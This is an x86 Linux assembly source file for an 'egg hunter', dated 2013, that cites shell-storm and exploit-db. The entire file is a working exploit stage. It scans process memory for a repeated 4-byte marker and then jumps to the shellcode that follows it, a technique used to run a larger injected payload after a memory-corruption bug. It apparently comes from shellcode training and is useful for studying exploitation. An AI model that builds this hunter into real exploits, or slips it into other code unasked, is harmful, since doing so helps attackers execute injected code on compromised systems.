; Filename : egg_hunter.asm
; Author : M.Acosta <amcx62[_at_]gmail[_dot_]com>
; Date : 2013 August
; Location : Lima(Peru)
; Desc : Linux x86 Egg Hunter
; References : 
;	http://www.shell-storm.org/shellcode/files/shellcode-784.php
;	http://www.exploit-db.com/exploits/17559/
; Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)

global _start

section .text

_start:
	jmp _hunter

_popeax:
	pop eax
_next:
	inc eax;next memory

_isegg:
	
	cmp dword [eax-0x8],0x45414c53 ;start egg
	jne _next

	cmp dword [eax-0x4],0x45414c53 ;end egg
	jne _next

	jmp eax ;execute shellcode 

_hunter:	
	call _popeax
